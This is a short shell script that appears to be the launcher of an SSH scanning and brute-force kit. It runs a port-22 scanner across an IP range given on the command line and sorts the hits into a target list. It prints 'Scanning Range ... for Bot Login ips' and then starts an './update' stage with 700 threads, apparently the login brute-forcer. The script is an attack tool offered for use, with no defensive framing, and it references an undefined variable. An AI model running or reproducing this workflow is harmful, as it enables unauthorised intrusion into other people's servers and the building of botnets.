RED='\e[0;31m'
WHITE='\e[1;37m'
LIGHTBLUE='\e[1;34m'
echo -e ${RED}
cat run
LIGHTBLUE='\e[1;34m'
./class 22 -a $1 -i $2 -s 10
cat bios.txt | sort | uniq >mfu.txt
echo -e ${LIGHTBLUE}
cat motd
echo -e ${LIGHTBLUE}
echo "Scanning Range $1 for Bot Login ips."
echo -e "Found $oopsnr2 ip's"
echo -e ${LIGHTBLUE}
./update 700